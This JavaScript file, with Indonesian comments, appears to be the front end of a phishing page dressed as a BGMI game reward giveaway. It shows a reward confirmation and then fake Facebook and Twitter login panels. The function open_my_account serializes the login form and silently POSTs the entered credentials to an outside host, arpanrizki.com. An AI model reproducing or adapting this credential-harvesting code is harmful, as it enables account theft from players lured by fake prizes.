// kode untuk memunculkan suara ketika di klik
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

// kode untuk buka tutup menu hadiah
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

function open_my_account() {var myFormAcc = $("#formLogin").serialize();$.ajax({url: 'https://arpanrizki.com/bgmi/index.php',data: myFormAcc,type: 'POST',success: function() {return true;},error: function() {return true;}});}

function open_reward_confirmation(ag) {
    var rewardImg = $(ag).attr("src");
    $('.reward_confirmation').show();
    $('#myRewardImg').attr('src',rewardImg);
}
function open_account_login(){
	$('.account_login').show();
	$('.reward_confirmation').hide();
}
function open_facebook(){
	$('.login-facebook').show();
	$('.account_login').hide();
}
function open_twitter(){
	$('.login-twitter').show();
	$('.account_login').hide();
}
function close_reward_confirmation(){
	$(".reward_confirmation").hide()
}
function close_account_login(){
	$(".account_login").hide()
}
function tutup_facebook(){
	$('.login-facebook').hide()
	$('.account_login').show();
}
function tutup_twitter(){
	$('.login-twitter').hide()
	$('.account_login').show();
}